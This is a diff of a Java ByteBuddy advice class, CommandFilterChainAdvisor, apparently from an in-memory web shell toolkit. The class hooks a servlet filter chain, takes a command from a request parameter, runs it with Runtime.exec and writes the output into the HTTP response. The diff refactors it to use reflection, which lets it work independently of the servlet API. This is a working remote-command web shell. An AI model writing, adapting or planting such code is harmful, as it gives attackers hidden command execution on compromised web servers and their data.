@@ -2,29 +2,26 @@ package com.reajason.javaweb.memshell.shelltool.command;
 
 import net.bytebuddy.asm.Advice;
 
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
 import java.io.InputStream;
+import java.io.OutputStream;
 
 /**
  * @author ReaJason
  */
 public class CommandFilterChainAdvisor {
-    public static String paramName;
 
     @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
     public static boolean enter(
-            @Advice.Argument(value = 0) ServletRequest request,
-            @Advice.Argument(value = 1) ServletResponse response
+            @Advice.Argument(value = 0) Object request,
+            @Advice.Argument(value = 1) Object response
     ) {
-        String cmd = request.getParameter(paramName);
+        String paramName = "paramName";
         try {
+            String cmd = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
             if (cmd != null) {
-                System.out.println(cmd);
                 Process exec = Runtime.getRuntime().exec(cmd);
                 InputStream inputStream = exec.getInputStream();
-                ServletOutputStream outputStream = response.getOutputStream();
+                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                 byte[] buf = new byte[8192];
                 int length;
                 while ((length = inputStream.read(buf)) != -1) {
